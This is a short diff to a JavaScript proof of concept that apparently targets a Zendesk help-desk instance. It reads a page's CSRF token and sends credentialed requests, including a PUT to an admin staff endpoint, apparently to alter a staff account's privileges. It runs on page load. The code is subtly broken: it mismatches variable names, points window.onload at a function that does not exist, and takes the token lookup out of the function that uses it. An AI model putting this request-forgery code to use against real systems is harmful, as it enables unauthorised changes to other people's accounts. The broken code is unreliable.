@@ -1,6 +1,15 @@
+
+function loadDoc2() {
+    var xhttp = new XMLHttpRequest();
+    xhr.open('GET','https://hackerone5759.zendesk.com/agent',true);
+    const { content } = document.querySelector('meta[name="csrf-token"]'); 
+    xhttp.withCredentials = true;
+}
+
+window.onload = loadDoc12;
+
 function loadDoc1() {
     var xhr = new XMLHttpRequest();
-    const { content } = document.querySelector('meta[name="csrf-token"]'); 
     xhr.open('PUT','https://hackerone5759.zendesk.com/api/admin/private/staff/19845800449181',true);
     xhr.setRequestHeader('Content-type','application/json');
     xhr.setRequestHeader('X-Csrf-Token',content);
